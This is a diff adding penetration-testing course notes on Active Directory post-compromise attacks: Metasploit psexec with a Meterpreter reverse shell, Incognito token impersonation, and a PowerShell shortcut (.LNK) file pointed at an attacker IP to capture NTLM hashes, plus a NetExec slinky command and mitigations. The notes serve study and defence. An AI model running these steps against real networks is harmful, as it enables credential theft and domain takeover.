@@ -314,6 +314,96 @@ Mitigation:
 
 Method:
 
-1. You can use Metasploit in Kali Linux. Search for and use the payload of "psexec". Set all the details (e.g., username, password of compromised account etc.).
-2. Run "options" and Set the payload.s
+1. You can use Metasploit in Kali Linux. Search for and use the payload of "psexec". We use psexec because it's used for remote code execution over SMB, provided you have valid credentials.&#x20;
+2. Run "options" and set the payload for "windows/x64/meterpreter/reverse\_tcp". Set all the details (e.g., machine IP, username, password of compromised account etc.).
 
+{% hint style="info" %}
+At this point, you have just got a Meterpreter session on the target machine. You are simply getting onto that machine by this point.&#x20;
+{% endhint %}
+
+3. Once you have the Meterpreter shell, you have the option to run "shell" and get access to the Windows CMD CLI as an admin user (assuming you used admin credentials for this attack). If you used local admin creds for that machine, you'd be a local admin. If you used domain admin creds for that machine, you'd be a domain admin. From here, you could create a new account added to the domain admin group (as another foothold) if you needed to.&#x20;
+4. From the Meterpreter shell, type in "load incognito". Incognito is a Meterpreter extension that adds commands for listing available tokens, impersonating a token, creating tokens etc. You need to load it to be able to use commands for token impersonation.&#x20;
+5. Type in "help" to get the list of Incognito commands.&#x20;
+6. Type in "list\_tokens -u" to see the delegate tokens available. This will tell you the users that are logged in. If a DA logged in earlier, their token would be here.&#x20;
+7. Impersonate a token by using the "impersonate\_token" command. E.g., if you had a MARVEL\Administrator user delegate token:
+
+{% code title="We use "\\" because "\" is an escape character in Ruby (what Meterpreter is written in)." %}
+```
+impersonate_token MARVEL\\administrator
+```
+{% endcode %}
+
+8. If this works, you'll get a shell. Once impersonated, you could dump creds from the DC, create new domain admin accounts, do anything the user you impersonate can do.
+
+{% hint style="info" %}
+Basically, what is happening here is that you have admin creds on one machine. On that machine, an escalated user, like a Domain Admin, might be logged in (their delegate token is there). You steal/impersonate their token and then use that to authenticate laterally to another machine to get admin privileges there. Then, you can use PsExec there to get a session.&#x20;
+{% endhint %}
+
+
+
+Mitigation:
+
+1. Limit user/group token creation permission.
+2. Restriction on who is allowed to be a local admin on workstations (i.e., prevent server admins from being local admins) - prevent domain admins/other high-priv accounts from logging into regular workstations. This prevents their token from appearing there, to prevent them from being stolen by an attacker who aims to attack low-level machines first then escalate via vertical movement.&#x20;
+
+***
+
+## .LNK (Link) File Attacks:
+
+* This is placing a malicious file in a shared folder. We can capture hashes using this.&#x20;
+* We can use PowerShell for this (we need it to be elevated from your attacker machine).&#x20;
+
+
+
+Method (in escalated PS):
+
+1. $objShell = New-Object -ComObject WScript.shell
+
+-> This creates a new COM object to build a Windows shortcut.
+
+2. $lnk = $objShell.CreateShortcut("C:\test.lnk")
+
+-> This creates a new shortcut file - test.lnk.
+
+3. $lnk.TargetPath = "\\\192.168.138.149\\@test.png"
+
+-> This points the link to the attacker's target machine IP. The filename "test.png" doesn't matter. Windows will still try to access it.
+
+4. $lnk.WindowStyle = 1
+5. $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+6. $lnk.Description = "Test"
+7. $lnk.HotKey = "Ctrl+Alt+T"
+8. $lnk.Save()
+
+-> Saves the shortcut file to the disk.
+
+-> Steps 4-7 are cosmetic, to make the shortcut link look legitimate (social engineering feature).
+
+
+
+OPTIONAL:
+
+1. You can put the file onto the machine through this command in CME/NetExec:
+
+```shellscript
+root@kali:~# netexec/crackmapexec smb [Target IP] -d [Domain] -u [Username] -p [Password] -M slinky -o NAME=[Filename to Place] SERVER = [Attacker IP]
+```
+
+{% hint style="info" %}
+This works because Windows tries to resolve the target path of a shortcut and this can only be done by contacting the remote SMB path. This means even if the user never clicks on it, as long as they go to the directory where it's stored, Windows will send authentication metadata, potentially NTLM hashes in an attempt to do an SMB connection attempt.&#x20;
+{% endhint %}
+
+
+
+***
+
+## Post-Compromise Strategy:
+
+* We start with a compromised account.
+
+
+
+1. Search for quick wins (e.g., Kerberoasting, Secretsdump, Pass attacks).
+2. Once quick wins are exhausted, enumerate and dig deeper (e.g., BloodHound, where does account have access.
+3. Think outside the box.
+4. Move laterally until you can move vertically and compromise the domain.&#x20;
